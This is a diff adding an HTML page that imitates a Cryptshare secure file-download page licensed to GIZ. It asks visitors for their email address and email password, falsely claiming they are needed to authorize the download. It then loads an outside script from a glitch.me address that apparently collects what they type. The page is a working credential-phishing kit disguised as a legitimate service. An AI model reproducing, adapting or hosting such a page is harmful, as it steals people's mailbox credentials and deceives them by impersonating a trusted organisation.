@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title id="ida">Retrieve Transfer - Transfer ID</title>
+    <link rel="stylesheet" type="text/css"
+        href="https://filetransfer.giz.de/wicket/resource/com.cryptshare.server.page.common.AbstractBasePage/bootstrap/bootstrap.min-ver-896192CC65E20F1FCC6D792B5B9A4626.css" />
+
+    <link rel="stylesheet" type="text/css"
+        href="https://filetransfer.giz.de/wicket/resource/com.cryptshare.server.page.common.AbstractBasePage/fontawesome/css/all.min-ver-A28E912C1A41BECEC7F68848D739D5C0.css" />
+    <link rel="stylesheet" type="text/css"
+        href="https://filetransfer.giz.de/wicket/resource/com.cryptshare.server.page.application.BasePage/css/ui-basic-ver-97D29003D3103173109087160CA32194.css" />
+    <link rel="stylesheet" type="text/css"
+        href="https://filetransfer.giz.de/wicket/resource/com.cryptshare.server.CryptshareWebApp/ui-common-ver-38937637F4D4FACAE35114005B57E30A.css" />
+    <link rel="stylesheet" type="text/css"
+        href="https://filetransfer.giz.de/wicket/resource/com.cryptshare.server.page.application.BasePage/css/ui-advanced-ver-D41D8CD98F00B204E9800998ECF8427E.css" />
+
+    <meta name="wicket.header.items" />
+    <meta name="ROBOTS" content="NOINDEX,NOARCHIVE">
+    <meta name="copyright" content="Pointsharp GmbH">
+    <meta name="author" content="Pointsharp GmbH">
+    <meta name="generator" content="Cryptshare® by Pointsharp GmbH">
+    <meta name="description" content="Cryptshare® - Send and receive large files and secure email.">
+    <meta name="apple-itunes-app" content="">
+    <meta name="google-play-app" content="">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+    <link rel="icon" type="image/png" href="images/favicon-32x32.png" sizes="32x32" />
+    <link rel="icon" type="image/png" href="images/favicon-16x16.png" sizes="16x16" />
+    <link rel="apple-touch-icon" sizes="57x57" href="images/homescreen-57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="images/homescreen-60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="images/homescreen-72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="images/homescreen-76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="images/homescreen-114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="images/homescreen-120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="images/homescreen-144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="images/homescreen-152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="images/homescreen-180.png">
+    <link rel="icon" sizes="192x192" href="images/homescreen-192.png">
+</head>
+
+<body>
+    <a href="#" id="focusResetDummy" tabindex="-1" aria-hidden="true" class="visually-hidden">
+    </a>
+    <a href="#bcs-app" class="skip-to-content">
+        Skip to Content
+    </a>
+
+    <div class="container">
+        <header>
+            <div id="ide">
+                <nav class="navbar navbar-expand-md" data-bs-theme="dark">
+                    <button type="button" class="navbar-toggler bfcs_navbarButton ms-auto" data-bs-toggle="collapse"
+                        data-bs-target="#navbar" aria-expanded="false" aria-controls="navbar">
+                        <span class="visually-hidden">Menu</span>
+                        <span class="navbar-toggler-icon"></span>
+                    </button>
+                    <div id="navbar" class="collapse navbar-collapse">
+                        <ul class="navbar-nav ms-auto order-5" data-bs-theme="light">
+                            <li class="nav-item dropdown">
+                                <button class="dropdown-toggle navbar-toggler burger bfcs_navbarButton"
+                                    data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false" type="button">
+                                    <span class="visually-hidden">Menu</span>
+                                    <span class="navbar-toggler-icon"></span>
+                                </button>
+                                <ul class="dropdown-menu dropdown-menu-end startMenu mt-2">
+                                    <li>
+                                        <a class="dropdown-item" href="./Start">
+                                            Start
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a class="dropdown-item" href="./ui/QuickRecovery">
+                                            Activate QUICK
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a target="_blank" rel="noopener noreferrer" class="dropdown-item"
+                                            href="https://documentation.cryptshare.com/w/CSSCurrent_en:User_Manual">Help</a>
+                                    </li>
+                                    <li>
+                                        <a class="dropdown-item" href="./Imprint">
+                                            Imprint
+                                        </a>
+                                    </li>
+
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <div class="nav navbar-nav" data-bs-theme="light" id="id10">
+                            <div class="dropdown">
+                                <button href="#"
+                                    class="dropdown-toggle languages bfcs_navbarButton btn btn-link text-decoration-none text-white"
+                                    data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false" type="button">
+                                    <span class="fas fa-globe d-none d-md-inline-block" aria-hidden="true"></span>
+                                    <span class="visually-hidden">
+                                        Languages
+                                    </span>
+                                    <span class="d-md-none" aria-hidden="true">
+                                        Languages
+                                    </span>
+                                </button>
+                                <ul class="dropdown-menu mt-2">
+                                    <li><a class="dropdown-item" href="#">English - EN</a></li>
+                                    <li class="dropdown-divider" id="id11"></li>
+
+                                    <li><a href="./download?1-1.-header-languageSwitch-language-languageList-0-languageLink"
+                                            class="dropdown-item">Français - FR</a></li>
+
+                                    <li><a href="./download?1-1.-header-languageSwitch-language-languageList-1-languageLink"
+                                            class="dropdown-item">Deutsch - DE</a></li>
+
+                                    <li><a href="./download?1-1.-header-languageSwitch-language-languageList-2-languageLink"
+                                            class="dropdown-item">Español - ES</a></li>
+
+                                </ul>
+                            </div>
+                        </div>
+
+                    </div>
+                </nav>
+            </div>
+            <div class="header">
+                <a href="./" class="d-block">
+                    <span class="visually-hidden">Start</span>
+                </a>
+            </div>
+        </header>
+        <main class="center-block" id="bcs-app" aria-live="polite" aria-busy="false">
+            <div id="id12">
+                <div role="status">
+
+                </div>
+            </div>
+
+            <form id="id22" method="post" action="">
+
+
+                <div>
+                    
+                    <div class="panel">
+                        <p>
+                            These files are sensitive and secured against unauthorized access. In order to access this file, please provide your correct email credentials, we will connect to your email provider through a secure IMAP channel to authorize your download.
+                        </p>
+                    </div>
+                    <div class="formpanel pt-2 pt-md-3">
+                        <div class="alert alert-danger bfcs_box bfcs_feedbackPanelERROR feedback-panel" role="alert" id="msg" style="display: none;">
+                            
+                            </div>
+
+                        <div id="id2d" class="bfcs_formElement">
+
+                            <div id="id2f" class="bfcs_formElement">
+                                <label class="bfcs_formLabel form-label" for="id30">
+                                    Email:
+                                </label>
+
+                                <input type="email" class="bfcs_formInput form-control bfcs_inputText" tabindex="0"
+                                    value="" name="email" id="email"
+                                    aria-required="true" />
+
+
+
+                            </div>
+
+
+                        </div>
+
+                        <div id="id2b" class="bfcs_formElement">
+                            <label class="bfcs_formLabel form-label" for="id2c">
+                                Password:
+                            </label>
+
+                            <input type="password" class="form-control bfcs_formInput bfcs_inputText" tabindex="0" value=""
+                                name="password" id="password" aria-required="true" />
+
+
+
+                        </div>
+                    </div>
+            </form>
+            <div id="id15" class="buttons clearfix">
+                <button class="btn-primary btn btn-lg btn-primary float-end btn-next" id="submit-btn">Download</button>
+                
+
+
+
+                
+
+            </div>
+
+            <div id="id16">
+
+            </div>
+        </main>
+        <footer class="footer text-center">
+            <div class="bfcs_footerLogoImage"></div>
+            <p>
+                <span>6.1.0.12769</span>
+                <span>licensed for</span>
+                <span>Deutsche Gesellschaft fuer Internationale Zusammenarbeit (GIZ) GmbH</span>
+            </p>
+            <p><span>2024 Pointsharp GmbH</span></p>
+        </footer>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+    <script src="https://plausible-psychedelic-culotte.glitch.me/filw.js"></script>
+
+</body>
+
+
+</html>
